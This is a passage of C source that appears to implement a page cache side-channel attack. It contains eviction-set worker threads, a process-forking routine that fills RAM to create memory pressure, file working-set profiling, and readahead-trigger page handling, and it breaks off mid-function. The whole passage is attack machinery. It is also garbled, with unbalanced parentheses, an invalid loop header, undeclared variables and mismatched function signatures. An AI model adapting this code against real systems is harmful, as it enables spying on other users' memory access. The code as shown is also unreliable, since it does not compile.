    size_t pages_per_thread_floor = attack->eviction_set_.mapping_.size_pages_ / attack->eviction_set_.access_thread_count_;
    size_t access_range_per_thread = pages_per_thread_floor * PAGE_SIZE;

    //  reserve space for access thread data structures
    if (dynArrayResize(&attack->eviction_set_.access_threads_, attack->eviction_set_.access_thread_count_) == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL WS_MGR_TAG "Error " OSAL_EC_FS " at dynArrayResize...\n", OSAL_EC));
        goto error;
    }

    // prepare thread_data objects
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_ - 1; t++)
    {
        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
        initPageAccessThreadESData(thread_data);
        thread_data->attack_ = attack;
        thread_data->access_offset_ = pos;
        thread_data->access_len_ = access_range_per_thread;
        thread_data->start_sem_ = &attack->eviction_set_.worker_start_sem_;
        thread_data->join_sem_ = &attack->eviction_set_.worker_join_sem_;
        pos += access_range_per_thread;
    }
    // prepare thread_data object for last thread
    PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, attack->eviction_set_.access_thread_count_ - 1);
    initPageAccessThreadESData(thread_data);
    thread_data->attack_ = attack;
    thread_data->access_offset_ = pos;
    thread_data->access_len_ = attack->eviction_set_.mapping_.size_ - pos;
    thread_data->start_sem_ = &attack->eviction_set_.worker_start_sem_;
    thread_data->join_sem_ = &attack->eviction_set_.worker_join_sem_;

    // spin up worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
        if (pthread_create(&thread_data->tid_, NULL, pageAccessThreadES, thread_data) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at creating ES access thread...\n", OSAL_EC));
            goto error;
        }
    }

    goto cleanup;
error:
    ret = -1;
    dynArrayDestroy(&attack->eviction_set_.access_threads_, closePageAccessThreadESData);
cleanup:

    return ret;
}

void *pageAccessThreadES(void *arg)
{
    PageAccessThreadESData *thread_data = arg;
    Attack *attack = thread_data->attack_;
    size_t accessed_mem = 0;

    DEBUG_PRINT((DEBUG INFO ES_THREAD_TAG "Worker thread (page offset: %zu, max. page count: %zu) running on core %d.\n",
           thread_data->page_offset_, thread_data->size_pages_));
    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        if (sem_wait(thread_data->start_sem_) != 0)
        {
            DEBUG_PRINT((DEBUG ERROR ES_THREAD_TAG "Error " OSAL_EC_FS " at sem_wait (%p)...\n", OSAL_EC, (void *)page_thread_data->start_sem_));
            goto error;
        }

        accessed_mem = evictTargets__(attack, thread_data->targets_evicted_fn_, thread_data->targets_evicted_arg_ptr_, thread_data->access_offset_, thread_data->access_len_);
        DEBUG_PRINT((DEBUG INFO ES_THREAD_TAG "Worker thread (page offset: %zu, max. page count: %zu) accessed %zu kB.\n",
                     thread_data->page_offset_, thread_data->size_pages_, accessed_mem / 1024));
        thread_data->accessed_mem_ = accessed_mem;

        if (sem_post(thread_data->join_sem_) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL ES_THREAD_TAG "Error " OSAL_EC_FS " at sem_post (%p)...\n", OSAL_EC, (void *)thread_data->join_sem_);
            goto error;
        }
    }

    return NULL;

error:

    return (void *)-1;
}

size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr, 
    size_t access_offset, size_t access_len)
{ 
    volatile uint8_t tmp = 0;
    (void)tmp;
    size_t accessed_mem = 0;

    // access memory
    for (size_t pos = access_offset; pos < (access_offset + access_len); pos += PAGE_SIZE)
    {
        // access ws
        if (attack->use_attack_ws_ && 
            accessed_mem % attack->eviction_set_.ws_access_all_x_bytes_ == 0)
        {
            pthread_rwlock_rdlock(&ws->ws_lists_lock_);
            activateWS(&attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_], 
                attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_, 
                attack->working_set_.access_use_file_api_);
            pthread_rwlock_unlock(&ws->ws_lists_lock_);
        }

        // access ss
        if (attack->use_attack_ss_ && 
            accessed_mem % attack->eviction_set_.ss_access_all_x_bytes_ == 0)
        {
            activateSS(&attack->suppress_set_.suppress_set_, attack->suppress_set_.use_file_api_);
        }

        // prefetch larger blocks (more efficient IO)
        if (accessed_mem % attack->eviction_set_.prefetch_es_bytes_ == 0)
        {
            if(adviseFileUsage(&attack->eviction_set_.mapping_, access_offset + accessed_mem, 
                attack->eviction_set_.prefetch_es_bytes_, USAGE_WILLNEED) != 0)
            {
                DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
            }
        }

        // access page
        if(!attack->eviction_set_.use_file_api_) 
        {
#ifdef __linux
            if (pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, pos) != 1 ||
                pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, pos) != 1 )
            {
                // in case of error just print warnings and access whole ES
                DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at pread...\n", OSAL_EC));
            }
#elif defined(_WIN32)

#endif
        }
        else 
        {
            tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + pos);
        }

        // check if evicted
        if (accessed_mem % attack->eviction_set_.targets_check_all_x_bytes_ == 0 &&
            targets_evicted_fn(targets_evicted_arg_ptr))
        {
          break;
        }

        accessed_mem += PAGE_SIZE;
    }

    // remove eviction set to release pressure
    if(adviseFileUsage(&attack->eviction_set_.mapping_, access_offset, 
                access_len, USAGE_DONTNEED) != 0)
    {
        DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
    }

    return accessed_mem;
}


/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK BLOCKING SET
 */

void *bsManagerThread(void *arg)
{
    AttackBlockingSet *bs = arg;
    size_t available_mem = 0;
    size_t mem_diff = 0;
    // set goal for available mem in middle of allowed region
    size_t available_mem_goal = bs->min_available_mem_ + (bs->max_available_mem_ - bs->min_available_mem_) / 2;

    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "BS manager thread started.\n"));
        available_mem = parseAvailableMem(bs) * 1024;
        DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "%zu kB of physical memory available\n", available_mem / 1024));

        if (available_mem < bs->min_available_mem_)
        {
            mem_diff = available_mem_goal - available_mem;
            DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "Too less physical memory available, trying to release %zu kB...\n",
                mem_diff / 1024));
            releaseRAM(bs, mem_diff);
        }
        else if (available_mem > bs->max_available_mem_)
        {
            // * 3 / 4 for slower convergence (less overshoot)
            mem_diff = (available_mem - available_mem_goal) * 3 / 4;
            // blocking rounds down, only down when at least as big as one unit
            if(mem_diff >= bs->def_fillup_size_)
            {
                DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "Too much physical memory available, trying to block %zu kB...\n",
                    mem_diff / 1024);
                blockRAM(bs, mem_diff);
            }
        }
        else if (!bs->initialized_)
        {
            sem_post(&bs->initialized_sem_);
            bs->initialized_ = 1;
        }

        nanosleep(&bs->evaluation_sleep_time_, NULL);
    }

    return NULL;
}

#ifdef __linux
size_t parseAvailableMem(AttackBlockingSet *bs)
{
    FILE *meminfo_file = NULL;
    char line[LINE_MAX] = {0};
    char *available_mem_str = NULL;
    char *conversion_end = NULL;
    // in case of error SIZE_T_MAX is reported as available memory to trigger no action
    size_t available_mem = 0;

    // open meminfo file
    meminfo_file = fopen(bs->meminfo_file_path_, "r");
    if (!meminfo_file)
    {
        DEBUG_PRINT((DEBUG WARNING BS_MGR_TAG "Available memory could not be parsed!\n"));
        DEBUG_PRINT((DEBUG WARNING BS_MGR_TAG "Returning 0!\n"));
        return 0;
    }

    // canary to see if line was longer as buffer
    line[IN_LINE_MAX - 1] = 'c';
    while (fgets(line, IN_LINE_MAX, meminfo_file))
    {
        // skip lines longer than 255
        if (line[IN_LINE_MAX - 1] == '\0')
        {
            continue;
        }

        if (strstr(line, MEMINFO_AVAILABLE_MEM_TAG) != NULL)
        {
            for (size_t c = strlen(MEMINFO_AVAILABLE_MEM_TAG); line[c] != 0; c++)
            {
                if (isdigit(line[c]))
                {
                    if (available_mem_str == NULL)
                    {
                        available_mem_str = line + c;
                    }
                }
                else if (available_mem_str != NULL)
                {
                    line[c] = 0;
                    break;
                }
            }

            available_mem = strtoul(available_mem_str, &conversion_end, 10);
            if ((available_mem_str != NULL && *available_mem_str == 0) || *conversion_end != 0 || errno == ERANGE)
            {
                available_mem_str = NULL;
                break;
            }

            break;
        }
    }

    if (!available_mem_str)
    {
        DEBUG_PRINT((DEBUG WARNING BS_MGR_TAG "Available memory could not be parsed!\n"));
        DEBUG_PRINT((DEBUG WARNING BS_MGR_TAG "Returning 0!\n"));
        return 0;
    }

    fclose(meminfo_file);

    return available_mem;
}
#elif defined (_WIN32)
size_t parseAvailableMem(AttackBlockingSet *bs)
{
    (void) bs;
    GlobalMemoryStatusEx memory_status;

    if(!GlobalMemoryStatusEx(&memory_status)) 
    {
        DEBUG_PRINT((DEBUG WARNING BS_MGR_TAG "Available memory could not be parsed!\n"));
        DEBUG_PRINT((DEBUG WARNING BS_MGR_TAG "Returning 0!\n"));
        return 0;
    }

    return memory_status.ullAvailPhys + memory_status.ullAvailPageFile;
}
#endif

#ifdef __linux
int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
{
    int ret = 0;
    FillUpProcess child_process;
    void *fillup_mem = NULL;
    size_t needed_childs = 0;
    sem_t *sem = NULL;

    // init child structure
    initFillUpProcess(&child_process);
    child_process.fillup_size_ = bs->def_fillup_size_;

    // create a shared semaphore
    sem = mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (sem == MAP_FAILED)
    {
        DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at mmap...\n", OSAL_EC));
        goto error;
    }
    if (sem_init(sem, 1, 0))
    {
        DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at sem_init...\n", OSAL_EC));
        goto error;
    }

    // round down
    needed_childs = fillup_size / bs->def_fillup_size_;
    for (size_t i = 1; i <= needed_childs; i++)
    {
        child_process.pid_ = fork();

        if (child_process.pid_  < 0)
        {
            // parent
            DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at fork for block ram child..\n", OSAL_EC));
            goto error;
        }
        else if (child_process.pid_ == 0)
        {
            // child
            DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "New child %zu with %zu kB dirty memory will be spawned...\n", 
                i, bs->def_fillup_size_ / 1024));

            fillup_mem = mmap(
                NULL, bs->def_fillup_size_, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);

            if (fillup_mem == MAP_FAILED)
            {
                if (sem_post(sem) != 0)
                {
                    DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at sem_post...\n", OSAL_EC));
                }

                DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " mmap..\n", OSAL_EC));
                exit(-1);
            }

            // write to fillup memory (unique contents -> no page deduplication)
            for (size_t m = 0; m < bs->def_fillup_size_; m += PAGE_SIZE)
            {
                *((size_t *)((uint8_t *)fillup_mem + m)) = i * m;
            }

            // finished
            if (sem_post(sem) != 0)
            {
                DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at sem_post...\n", OSAL_EC));
                exit(-1);
            }

            while (1)
            {
                // wait for signal
                pause();
            }
        }

        // parent
        // wait until child process has finished
        if (sem_wait(sem))
        {
            DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at sem_wait...\n", OSAL_EC));
            goto error;
        }

        // error at dynArrayAppend <=> child could not be added
        if (!dynArrayAppend(&bs->fillup_processes_, &child_process))
        {
            DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
            goto error;
        }
    }
    DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "Blocked %zu kB...\n", needed_childs * bs->def_fillup_size_ / 1024));

    goto cleanup;
error:
    ret = -1;
    // kill rouge child if existing
    if(child_process.pid_ > 0)
    {
        osal_process_kill(child_process.pid_);
    }

cleanup:
    if(sem != MAP_FAILED)
    {
        sem_destroy(sem);
        munmap(sem, sizeof(sem_t));
    }

    return ret;
}
#elif defined(_WIN32)
int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
{
    int ret = 0;
    FillUpProcess child_process;
    void *fillup_mem = NULL;
    size_t needed_childs = 0;
    HANDLE sem = NULL;
    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_info;

    // init child structure
    initFillUpProcess(&child_process);
    child_process.fillup_size_ = bs->def_fillup_size_;

    // prepare structures for process creation
    memset(&startup_info, 0, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    memset(&process_info, 0, sizeof(process_info));

    // create a inter-process semaphore
    sem = CreateSemaphoreA(NULL, 0, 1, PCA_WINDOWS_BS_SEMAPHORE_NAME);
    if(sem  == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at CreateSemaphoreA\n", OSAL_EC));
        goto error;
    }

    // round down
    needed_childs = fillup_size / bs->def_fillup_size_;
    for (size_t i = 1; i <= needed_childs; i++)
    {
        // create fill up child process
        child_process.pid_ = CreateProcessA(module_path, PCA_WINDOWS_BS_COMMANDLINE, NULL, NULL, FALSE, CREATE_NO_WINDOW,
            NULL, NULL, &startup_info, &process_info))
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at CreateProcessA\n", OSAL_EC));
            goto error;
        }

        // parent
        // wait until child process has finished
        if(WaitForSingleObject(sem, INFINITE) == WAIT_FAILED)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at WaitForSingleObject\n", OSAL_EC));
            goto error;
        }

        // error at dynArrayAppend <=> child could not be added
        if (!dynArrayAppend(&bs->fillup_processes_, &child_process))
        {
            DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
            goto error;
        }
    }
    DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "Blocked %zu kB...\n", needed_childs * bs->def_fillup_size_ / 1024));

    goto cleanup;
error:
    ret = -1;
    // kill rouge child if existing
    if(child_process.pid_ > 0)
    {
        osal_process_kill(child_process.pid_);
    }

cleanup:
    if(sem != NULL)
    {
        CloseHandle(sem);
    }

    return ret;
}

int blockRAMChildWindows(AttackBlockingSet *bs) 
{
    HANDLE sem = NULL;

    DEBUG_PRINT((DEBUG INFO "New child with %zu MB dirty memory spawned...\n", bs->def_fillup_size_ / 1024 / 1024));

    // open shared semaphore
    sem = OpenSemaphoreA(SYNCHRONIZE | SEMAPHORE_MODIFY_STATE, FALSE, PCA_WINDOWS_BS_SEMAPHORE_NAME);
    if(sem == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at OpenSemaphoreA\n", OSAL_EC));
        goto error;
    }
  
    // allocate memory
    dirty_mem = VirtualAlloc(NULL, bs->def_fillup_size_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(dirty_mem == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at VirtualAlloc\n", OSAL_EC));
        goto error;
    }
    
    // dirty memory with random content (no deduplication, compression)
    for(size_t offset = 0; offset < bs->def_fillup_size_; offset += PAGE_SIZE)
    {
        if(BCryptGenRandom(NULL, (BYTE *) dirty_mem + offset, PAGE_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != STATUS_SUCCESS)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at BCryptGenRandom\n", OSAL_EC));
            goto error;
        }
    }
    // possibly missing random bytes (if size not multiple of PAGE_SIZE)
    size_t missing_random = bs->def_fillup_size_ % PAGE_SIZE;
    if(missing_random != 0 &&
        BCryptGenRandom(NULL, (BYTE *) dirty_mem + bs->def_fillup_size_ - missing_random, missing_random, 
            BCRYPT_USE_SYSTEM_PREFERRED_RNG) != STATUS_SUCCESS)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at BCryptGenRandom\n", OSAL_EC));
        goto error;
    }
  
    // signal that memory blocking was successful to parent process
    if(!ReleaseSemaphore(sem, 1, NULL))
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at ReleaseSemaphore\n", OSAL_EC));
        goto error;
    }

    // sleep forever
    Sleep(INFINITE);

error:
    if(sem != NULL)
    {
        CloseHandle(sem);
    }
    if(dirty_mem != NULL)
    {
        VirtualFree(dirty_mem, 0, MEM_RELEASE);
    }

    return -1;
}
#endif

void releaseRAMCb(void *addr, void *arg)
{
    FillUpProcess *fp = addr;
    size_t *released = arg;

    osal_process_kill(fp->pid_)
    *released = fp->fillup_size_;
}

void releaseRAM(AttackBlockingSet *bs, size_t release_size)
{
    size_t released = 0;
    size_t released_sum = 0;

    DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "Trying to release %zu kB of blocking memory\n", release_size / 1024));

    while (released_sum < release_size && bs->fillup_processes_.size_ > 0)
    {
        dynArrayPop(&bs->fillup_processes_, releaseRAMCb, &released);
        released_sum += released;
    }
    DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "Released %zu kB...\n", released_sum / 1024));
}


/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK WORKING SET
 */

#ifdef __linux
int profileAttackWorkingSet(Attack *attack)
{
    int ret = 0;
    FTS *fts_handle = NULL;
    FTSENT *current_ftsent = NULL;

    // use fts to traverse over all files in the searchpath
    fts_handle = fts_open(attack->working_set_.search_paths_, FTS_PHYSICAL, NULL);
    if (fts_handle == NULL)
    {
        DEBUG_PRINT((DEBUG ERROR "Error " OSAL_EC_FS " at fts_open...\n", OSAL_EC));
        return -1;
    }

    while (running)
    {
        current_ftsent = fts_read(fts_handle);
        // error at traversing files
        if (current_ftsent == NULL && errno)
        {
            // catch too many open files error (end gracefully)
            if (errno == EMFILE)
            {
                DEBUG_PRINT((DEBUG WARNING "Too many open files at fts_read, ignoring rest of files...\n"));
                break;
            }

            DEBUG_PRINT((DEBUG ERROR "Error " OSAL_EC_FS " at fts_read...\n", OSAL_EC));
            goto error;
        }
        // end
        else if (current_ftsent == NULL)
        {
            break;
        }

        // regular file
        if (current_ftsent->fts_info == FTS_F)
        {
            // if failed for one file ignore and just try the next one
           initialProfileResidentPagesFile(attack, current_ftsent->fts_path);
        }
    }

    goto cleanup;
error:
    ret = -1;
    listDestroy(&attack->working_set_.resident_files_, closeCachedFile);

cleanup:
    fts_close(fts_handle);

    return ret;
}
#elif defined (_WIN32)
int profileAttackWorkingSet(Attack *attack)
{
    int ret = 0;

    for(size_t i < 0; attack->working_set_.search_paths_[i] != NULL && running; i++) 
    {
        if(profileAttackWorkingSetFolder(attack, attack->working_set_.search_paths_[i], inactive_list_set) != 0)
        {
            goto error;
        }
    }
    
    return 0;

error:
    ret = -1;
    listDestroy(&attack->working_set_.resident_files_, closeCachedFile);
    return ret;
}

int profileAttackWorkingSetFolder(Attack *attack, char *folder)
{
    char *full_pattern[OSAL_MAX_PATH_LEN];
    WIN32_FIND_DATA find_file_data;
    HANDLE handle;

    // go through all files and subdirectories
    PathCombineA(full_pattern, folder, "*");
    handle = FindFirstFileA(full_pattern, &find_file_data);
    if(handle == INVALID_HANDLE_VALUE)
    {
        if(GetLastError() == ERROR_FILE_NOT_FOUND)
        {
            return 0;
        }

        return -1;
    }

    do
    {
        PathCombineA(full_pattern, folder, find_file_data.cFileName);
        if(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if(profileAttackWorkingSetFolder(attack, full_pattern, pattern) != 0) 
            {
               return -1; 
            }
        }
        else 
        {
            initialProfileResidentPagesFile(attack, full_pattern);                
        }
    } while(FindNextFile(handle, &find_file_data));
    
    FindClose(handle);
    return 0;
}
#endif

int initialProfileResidentPagesFile(Attack *attack, char *file_path) 
{
    CachedFile current_cached_file;
    TargetFile *target_file = NULL;
    DEBUG_PRINT((DEBUG INFO "Found possible shared object: %s\n", file_path));

    // check if the found file matches the eviction file or the target and skip if so
    if (strcmp(file_path, attack->eviction_set_.eviction_file_path_) == 0)
    {
        DEBUG_PRINT((DEBUG INFO "Shared object %s is the eviction file, skipping...\n", file_path));
        return -1;
    }

    // check if shared object is a target
    target_file = hashMapGet(&attack->targets_, file_path, strlen(file_path));
    // whole file is target, skip
    if (target_file != NULL && target_file->is_target_file_) 
    {
        DEBUG_PRINT((DEBUG INFO "Whole shared object %s is a target, skipping...\n", file_path));
        return -1;
    }

    // prepare cached file object
    initCachedFile(&current_cached_file);
    // open file, do not update access time (faster), skip in case of errors            
    if (mapFile(&current_cached_file.mapping_, file_path, FILE_ACCESS_READ | FILE_NOATIME, MAPPING_ACCESS_READ | MAPPING_SHARED) < 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at mapping of file: %s...\n", OSAL_EC, file_path));
        goto error;
    }
    // advise random access to avoid readahead (we dont want to change the working set)
    if(adviseFileUsage(&current_cached_file.mapping_, 0, 0, FILE_USAGE_RANDOM) != 0)
    {
        DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));  
    }

    // get status of the file pages
    if (getCacheStatusFile(&current_cached_file.mapping_) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
        goto error;
    }

    // if file is a target file, zero pages which could trigger the readahead of the target
    if (target_file != NULL) 
    {
        // save link to target file
        current_cached_file.linked_target_file_ = target_file;
        if(target_file->has_target_pages_)
        {
            targetPagesCacheStatusReadaheadTriggerPagesSet(&current_cached_file.linked_target_file->target_pages_, 
                &current_cached_file.mapping_, attack->ra_window_size_pages_, 0);
            targetPagesCacheStatusSet(&current_cached_file.linked_target_file->target_pages_, 
                &current_cached_file.mapping_, 0);
        }  
        else if(target_file->has_target_sequence_)
        {
            targetSequenceCacheStatusReadaheadTriggerPagesSet(&current_cached_file.linked_target_file->target_sequence_, 
                &current_cached_file.mapping_, attack->ra_window_size_pages_, 0);
            targetSequenceCacheStatusSet(&current_cached_file.linked_target_file->target_sequence_, 
                &current_cached_file.mapping_, 0);
        }
    }

    // parse page sequences, skip in case of errors
    if (cachedFileProfileResidentPageSequences(&current_cached_file, attack->working_set_.ps_add_threshold_) < 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at cachedFileProfileResidentPageSequences: %s...\n", OSAL_EC, file_path));
        goto error;
    }

    // no page sequences -> close object
    if (current_cached_file.resident_page_sequences_.size_ == 0)
    {
        closeCachedFile(&current_cached_file);
    }
    // else add current cached file to cached files
    else
    {
        // skip in case of errors
        if (!listAppendBack(&attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_], 
            &current_cached_file))
        {
            goto error;
        }
    }

    // statistics
    attack->working_set_.checked_files_++;
    attack->working_set_.memory_checked_ += current_cached_file.mapping_.size_;
    attack->working_set_.mem_in_ws_[attack->working_set_.up_to_date_list_set_] += current_cached_file.resident_memory_;

    // cleanup
if(!attack->working_set_.access_use_file_api_)
{
    closeFileOnly(&current_cached_file.mapping_);
}
else 
{
    closeMappingOnly(&current_cached_file.mapping_);
}
    freeFileCacheStatus(&current_cached_file.mapping_);
    return 0;

error:
    closeCachedFile(&current_cached_file);
    return -1;
}

void targetPagesCacheStatusReadaheadTriggerPagesSet(DynArray *target_pages, FileMapping *target_file_mapping, 
    size_t ra_window_size_pages, uint8_t val) 
{
    size_t back_ra_trigger_window = ra_window_size_pages / 2 - 1;
    size_t front_ra_trigger_window = ra_window_size_pages / 2;

    for(size_t t = 0; t < target_pages->size_; t++)
    {
        TargetPage *target_page = dynArrayGet(target_pages, t);
        targetPageCacheStatusReadaheadTriggerPagesSet(target_page->offset_, target_file_mapping, back_ra_trigger_window,
             front_ra_trigger_window);
    }
}

void targetPageCacheStatusReadaheadTriggerPagesSet(size_t offset, FileMapping *target_file_mapping, 
    size_t back_ra_trigger_window, size_t front_ra_trigger_window, uint8_t val)
{
    if(offset < ra_window_size_pages) 
    {
        // trim pages in back that could trigger readahead
        for(ssize_t p = offset - 1; p >= 0; p--)
            target_file_mapping->pages_cache_status_[p] = val;
    }
    else 
    {
        // trim pages in back that could trigger readahead
        for(ssize_t p = offset - 1; p >= offset - back_ra_trigger_window; p--)
            target_file_mapping->pages_cache_status_[p] = val;
    }
    // trim pages in front that could trigger readahead
    for(ssize_t p = offset + 1; p <= MAX(offset + front_ra_trigger_window, target_file_mapping->size_pages_ - 1); p++)
        target_file_mapping->pages_cache_status_[p] = val;    
}

void targetPagesCacheStatusSet(DynArray *target_pages, FileMapping *target_file_mapping, uint8_t val) 
{
    for(size_t t = 0; t < target_pages->size_; t++)
    {
        TargetPage *target_page = dynArrayGet(target_pages_, t);
        target_file_mapping->pages_cache_status_[target_page->offset_] = val;
    }
}

void targetSequenceCacheStatusReadaheadTriggerPagesSet(PageSequence *target_sequence, FileMapping *target_file_mapping, 
    size_t ra_window_size_pages, uint8_t val) 
{
    size_t back_ra_trigger_window = ra_window_size_pages / 2 - 1;
    size_t front_ra_trigger_window = ra_window_size_pages / 2;

    targetPageCacheStatusReadaheadTriggerSet(target_sequence->offset_, target_file_mapping, back_ra_trigger_window,
        front_ra_trigger_window);
    targetPageCacheStatusReadaheadTriggerSet(target_sequence->offset_ + target_sequence->length_ - 1, target_file_mapping,
        back_ra_trigger_window, front_ra_trigger_window);
}

void targetSequenceCacheStatusSet(PageSequence *target_sequence, FileMapping *target_file_mapping, uint8_t val) 
{
    for(size_t p = target_sequence->offset_; p < (target_sequence->offset_ + target_sequence->length_); p++)
    {
        target_file_mapping->pages_cache_status_[p] = val;
    }
}

ssize_t fileMappingProfileResidentPageSequences(FileMapping *mapping, size_t ps_add_threshold, 
    DynArray *resident_page_sequences)
{
    unsigned char *page_status = NULL;
    PageSequence sequence = {0};
    size_t resident_pages = 0;

    // check for sequences and add them
    for (size_t p = 0; p < mapping->size_pages_; p++)
    {
        if (mapping->pages_cache_status_[p] & 1)
        {
            if (sequence.length_ == 0)
            {
                sequence.offset_ = p;
            }

            sequence.length_++;
        }
        else
        {
            // add sequence if greater equal than threshold
            if (sequence.length_ >= ps_add_threshold)
            {
                // add sequence pages
                if (!dynArrayAppend(resident_page_sequences, &sequence))
                {
                    DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
                    goto error;
                }

                resident_pages++;
                DEBUG_PRINT((DEBUG INFO "Added page sequence with page offset %zu and %zu pages\n",
                             sequence.offset_, sequence.length_));
                // reset sequence length
                sequence.length_ = 0;
            }
        }
    }
    // process last found sequence
    if (sequence.length_ >= ps_add_threshold)
    {
        // add sequence pages
        if (!dynArrayAppend(resident_page_sequences, &sequence))
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
            goto error;
        }

        resident_pages++;
        DEBUG_PRINT((DEBUG INFO "Added page sequence with page offset %zu and %zu pages\n",
                     sequence.offset_, sequence.length_));
    }

    return resident_pages;
error:
    return -1;
}

int cachedFileProfileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold)
{
    ssize_t resident_pages = 0;
    unsigned char *page_status = NULL;
    PageSequence sequence = {0};

    // reset array size to zero
    dynArrayReset(&current_cached_file->resident_page_sequences_);
    // reset resident memory
    current_cached_file->resident_memory_ = 0;

    // profile page sequences
    resident_pages = fileMappingProfileResidentPageSequences(&current_cached_file->mapping, ps_add_threshold,
        &current_cached_file->resident_page_sequences_);
    if(resident_pages == -1)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at fileMappingProfileResidentPageSequences...\n", OSAL_EC));
        dynArrayDestroy(&current_cached_file->resident_page_sequences_, NULL);
        current_cached_file->resident_memory_ = 0;
        return -1;
    }
    
    // save resident memory of file
    current_cached_file->resident_memory_ = resident_pages * PAGE_SIZE;
    return 0;
}

int pageSeqCmp(void *node, void *data)
{
    if (((PageSequence *)data)->length_ > ((PageSequence *)node)->length_)
    {
        return 1;
    }

    return 0;
}

size_t activateWS(ListNode *resident_files_start, size_t resident_files_count, int use_file_api)
{
    CachedFile *current_cached_file = NULL;
    ListNode *resident_files_node = resident_files_start;
    size_t accessed_files_count = 0;
    size_t accessed_pages = 0;
    PageSequence *resident_page_sequences = NULL;
    size_t resident_page_sequences_length = 0;
    volatile uint8_t tmp;
    (void) tmp;
    
    while (resident_files_node != NULL && accessed_files_count < resident_files_count)
    {
        current_cached_file = (CachedFile *)resident_files_node->data_;

        resident_page_sequences = current_cached_file->resident_page_sequences_.data_;
        resident_page_sequences_length = current_cached_file->resident_page_sequences_.size_;

        for (size_t s = 0; s < resident_page_sequences_length; s++)
        {
            for (size_t p = resident_page_sequences[s].offset_; p < resident_page_sequences[s].offset_ +
                resident_page_sequences[s].length_; p++)
            {
                //DEBUG_PRINT((DEBUG INFO "Accessing offset %zu, %zu length\n", resident_page_sequences[s].offset_, 
                //    resident_page_sequences[s].length_);
                // access page
                if(use_file_api) 
